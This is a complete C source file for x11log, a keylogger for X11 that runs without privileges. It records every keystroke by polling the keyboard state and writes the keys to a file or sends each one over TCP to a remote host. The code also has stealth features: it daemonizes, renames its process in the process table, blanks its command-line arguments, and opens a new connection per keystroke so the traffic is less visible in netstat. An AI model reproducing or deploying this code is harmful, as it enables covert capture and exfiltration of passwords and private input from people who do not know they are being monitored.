/* vim: set ts=4 sw=4: */
/* -- x11log.c
 * x11log - an unprivileged, userspace keylogger for X11
 *
 * This code is licensed under GPLv3.
 * (c) Erik Sonnleitner 2007/2011, es@delta-xi.net
 * www.delta-xi.net
 *
 * Known Bugs/TODOs:
 *   - fatal() doesn't yet free heap memory (logfile, hostname, etc)
 *   - although cmdline arguments are removed, the TCP port number is still
 *     shown in the process tree.
 *   - process_name in obfuscation mode shouldn't be statically defined
 * */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>      /* signal() */
#include <unistd.h>      /* getopt() */
#include <ctype.h>       /* toupper() */

#include <sys/types.h>   /* time_t */
#include <sys/stat.h>    /* umask() */
#include <time.h>        /* time(), localtime(), asctime() */
#include <sys/socket.h>  /* socket(), send() */
#include <netinet/in.h>  /* inet datatypes */
#include <netdb.h>
#include <errno.h>
#include <stdarg.h>      /* variable argument list */

#include <X11/Xlib.h>
#include <X11/X.h>

#include "x11log.h"



/* We only want to detect changed keyboard states, so we declare two keymap
 * arrays (each holding a X keymap vector), whose contents are swapped in each
 * iteration in order to recognize changes. Pointers just for readability. */
static char keymap[2][XKBD_WIDTH],
		*kbd = keymap[0],
		*tmp = keymap[1];

static FILE *output;
static XModifierKeymap *map;
static Display *dsp;
static int verbosity = 1;
static struct opts_struct* options;


/* Here we go. */
int main (int argc, char ** argv) {
	int i;
	struct tm *timestart;
	struct opts_struct opts;

	options = &opts;
	timestart = initialize(argc, argv, &opts);

	/* NULL defaults to what is given in DISPLAY environment variable. However,
	 * in some cases (e.g. within a VC) this variable is not set; so better go
	 * with :0.0, which is the correct default display in 99% of all cases. This
	 * also works via SSH connections, as long as getuid() user is running X. */
	dsp = XOpenDisplay( (opts.display) ? opts.display : X_DEFAULT_DISPLAY );
	if(!dsp)
		fatal("Cannot open display");

	XSynchronize (dsp, True);
	map = XGetModifierMapping(dsp);

	XQueryKeymap(dsp, kbd);
	log(1, stderr, "\n\n--New Session at %s\n", asctime(timestart));

	/* we'll only try to find changed keys */
	for(;; usleep(DELAY)){
		SWAP(kbd, tmp, char*);
		XQueryKeymap(dsp, kbd);

		for (i = 0; i < XKBD_WIDTH * BYTE_LENGTH; i++)
			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
				log( 1, output, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
				fflush(output);

				if(opts.log_remote)
					transmit_keystroke_inet((char*)
						decodeKey(i, getbit(kbd, i), getMods(kbd)), &opts);
			}
	}
}

/**
 * Initialization stuff: parse arguments, define signal handlers, define
 * output stream, set default options. Returns time when init() finished.
 * */
struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
	int c, i, j;
	time_t rawtime;

	/* connect signals to handler-functions */
	signal(SIGTERM, signal_handler);
	signal(SIGINT,  signal_handler);
	signal(SIGHUP,  signal_handler);

	/* set default values for cmdline options */
	opts->display = X_DEFAULT_DISPLAY;
	opts->logfile = NULL;
	opts->silent = 0;
	opts->log_remote = 0;
	opts->remote_addr = NULL;
	opts->host = NULL;
	opts->port = 0;
	opts->daemonize = 0;
	opts->obfuscate = 0;

	/* parse cmdline arguments */
	while((c = getopt(argc, argv, "s:f:h?r:qdo")) != -1){
		switch(c) {
			case 's':
				if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
					break;

				opts->display = smalloc(sizeof(char) * strlen(optarg) + 1);
				strncpy(opts->display, optarg, strlen(optarg));
				break;
			case 'f':
				opts->logfile = smalloc(sizeof(char) * strlen(optarg) + 1);
				strncpy(opts->logfile, optarg, strlen(optarg));
				break;
			case 'r':
				opts->remote_addr = optarg;
				opts->log_remote = 1;
				break;
			case 'q':
				opts->silent = 1;
				verbosity = 0;
				break;
			case 'd':
				opts->daemonize = 1;
				break;
			case 'o':
				opts->obfuscate= 1;
				break;
			case 'h':
			case '?':
				log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
				log(0, stderr, " Usage: %s [OPTIONS]\n", argv[0]);
				log(0, stderr, " Available options:\n");
				log(0, stderr, "\t-s <DISPLAY>    X-Display to use, default is :0.0\n");
				log(0, stderr, "\t-f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
				log(0, stderr, "\t-r <HOST:PORT>  Log keystrokes to remote host. The other end needs a program listening on specified\n\t\t\tTCP port (e.g. using BSD netcat: 'nc -p <port> -k')\n");
				log(0, stderr, "\t-d              Daemonize (requires -f or -r or both).\n");
				log(0, stderr, "\t-q              Be quiet (no output to console).\n");
				log(0, stderr, "\t-o              Obfuscate process name in process table.\n");
				log(0, stderr, "\t-h|-?           Print usage.\n");

				exit(EXIT_FAILURE);
			default:
				break;
		}
	}

	/* logical constraints */
	if(opts->silent && !(opts->log_remote || opts->logfile))
		fatal("Argument -q requires either logging to file or remote host (-r|-f)");
	if(opts->daemonize && !(opts->log_remote || opts->logfile))
		fatal("Argument -d requires either logging to file or remote host (-r|-f)");
	if(opts->obfuscate && !opts->daemonize)
		fatal("Argument -o requires daemonization (-d)");

	/* log to file if given, use stdout otherwise  */
	if(opts->logfile == NULL) {
		output = stdout;
	} else {
		output = fopen(opts->logfile, "a");
		if(!output) {
			log(1, stderr, "Error writing to %s, fallback to console.\n", argv[1]);
			output = stdout;
		}
	}

	/* remote logging argument validation */
	if((opts->remote_addr != NULL)
		&& (strstr(opts->remote_addr, ":") != NULL) && opts->log_remote) {

		char* host_tmp = strtok(opts->remote_addr, ":");
		opts->host = smalloc(sizeof(char) * strlen(host_tmp) + 1);
		strncpy(opts->host, host_tmp, strlen(host_tmp));

		opts->port = atol( strtok(NULL, ":") );

		if(opts->port < TCP_PORT_MIN || opts->port > TCP_PORT_MAX)
			fatal("Invalid tcp port number");
	} else if (opts->remote_addr != NULL) {
		fatal("Illegal argument for remote logging");
	}

	/* to daemonize or not to daemonize */
	if(opts->daemonize)
		daemonize((opts->obfuscate) ? argv[0] : NULL);

	/* cmdline arguments are always hidden */
	for(i = 1; i < argc; i++)
		for (j = 0; j < strlen(argv[i]); j++)
			argv[i][j] = ' ';

	/* just for logging */
	rawtime = time(NULL);
	return localtime(&rawtime);
}

/**
 * checks keycodes and mods, and returns a human-readable interpretation of the
 * keyboard status.
 * */
char* decodeKey(int code, int down, int mod) {
	static char *str, dump[MAX_KEYLEN + 1];
	int i = 0, remapChar = 0;
	KeySym sym;

	sym = XKeycodeToKeysym(dsp, code, (mod == SHIFT_DOWN) ? True : False);
	if(sym == NoSymbol)
		return "";

	str = XKeysymToString(sym);
	if(!str)
		return "";

	sprintf(dump, "%s", str);

	/* shortenize (remap) char str if in mapping table */
	while (remap[i].src[0]) {
		if (strstr(dump, remap[i].src)) {
			strcpy(dump, remap[i].dst);
			remapChar = 1;
			break;
		}
		i++;
	}

	/* no remapping, but "long" keysym */
	if(dump[1] && !remapChar) {
		(down)
			? sprintf(dump, "%s%s%s", "[+", str, "]")
			: sprintf(dump, "%s%s%s", "[-", str, "]");
		return dump;
	}

	if(mod == CONTROL_DOWN) 
		sprintf(dump, "%c%c%c", '^', dump[0], '\0');

	if(mod == LOCK_DOWN) 
		dump[0] = toupper(dump[0]);

	return dump;
}

/**
 * Read the mod key(s) of the keymap state and return the present mods
 * */
int getMods(char *kbd) {
	int i;
	KeyCode kc;

	for (i = 0; i < map->max_keypermod; i++) {
		kc = map->modifiermap[ControlMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return CONTROL_DOWN;

		kc = map->modifiermap[ShiftMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return SHIFT_DOWN;

		kc = map->modifiermap[LockMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return LOCK_DOWN;
	}

	return 0;
}

/**
 * Retrieve one specific bit (idx) of a keymap vector
 * */
int getbit(char *kbd, int idx) {
	return kbd[idx/8] & (1<<(idx%8));
}


/**
 * Signal handler for SIGTERM, SIGINT and SIGHUP
 * */
void signal_handler(int sig) {
	switch(sig) {
	  //SIGINT and SIGTERM quit application
	  case(SIGINT):
	  case(SIGTERM):
		log(1, stderr, "\n -- x11log terminated.\n");
		if(output != stdout)
			fclose(output);

		if( strcmp(options->display, X_DEFAULT_DISPLAY) != 0)
			free( options->display );
		if( options->host != NULL )
			free( options->host );
		if( options->logfile != NULL )
			free( options->logfile );

		exit(EXIT_SUCCESS);
	  //SIGHUP forces flushing of buffer
	  case(SIGHUP):
		log(1, stderr, "\n -- SIGHUP: log flushed.\n");
		fflush(output);
	  	return; 
	}
}

/**
 * fatal: Print error message and abort execution.
 * */
void fatal(const char * msg){
	if(msg != NULL)
		log(0, stderr, "Fatal: %s.\n", msg);
	exit(EXIT_FAILURE);
}

/**
 * Transmit keystroke to a remote host, where some daemon is required to listen
 * at the given port. The TCP connection is newly established upon every call
 * to this function; this is inefficient, but also offers advantages (e.g.,
 * chances are lower that the user will see a constant TCP stream in netstat
 * output, etc). Returns the number of bytes read, or negative value on error.
 * */
int transmit_keystroke_inet(char* key, struct opts_struct *opts){
	int sock, bytes_sent;
	struct hostent *host;
	struct sockaddr_in server_addr;

	if((host = gethostbyname( opts->host )) == NULL)
		return ERR_DNS;

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return ERR_SOCKET;

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons( opts->port );
	server_addr.sin_addr = *((struct in_addr *)host->h_addr);
	bzero(&(server_addr.sin_zero),8);

	if(connect(sock, (struct sockaddr*)&server_addr, sizeof(struct sockaddr)) == -1) {
	printf("\nXXX: %s\n", strerror(errno));
		return ERR_CONNECT; }

	bytes_sent = send(sock, key, strlen(key), 0);
	close(sock);

	return bytes_sent;
}

/**
 * printf() wrapper, taking care of debug levels
 * */
void log(int level, FILE* stream, const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	
	if(verbosity >= level || (stream != stdout && stream != stderr))
		vfprintf(stream, fmt, args);

	va_end(args);
}


/**
 * Daemonize logger. If a process_name is given, the name of the newly created
 * child as it appears within the process table, is altered. Returns pid of
 * child process, or exits on error.
 * */
int daemonize(char* child_process_name){
	pid_t pid, sid;
	
	pid  = fork();
	if(pid < 0) 
		fatal("Error forking process");

	if(pid > 0)
		exit(EXIT_SUCCESS);
	
	umask(0);

	sid = setsid();
	if(sid < 0)
		fatal("Error setting SID for child process");

	if(chdir("/") < 0)
		fatal("Error setting work directory to /");
	
	/* process name obfuscation */
	if(child_process_name != NULL) {
		int process_name_len = strlen(child_process_name);
		strncpy(child_process_name, PROCESS_FAKE_NAME, process_name_len);
	}

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	return pid;
}

/**
 * Secure malloc
 * */
void* smalloc(size_t size) {
	void* ptr;
	
	if((ptr = malloc(size)) == NULL)
		fatal("Unable to allocate memory");

	return ptr;
}
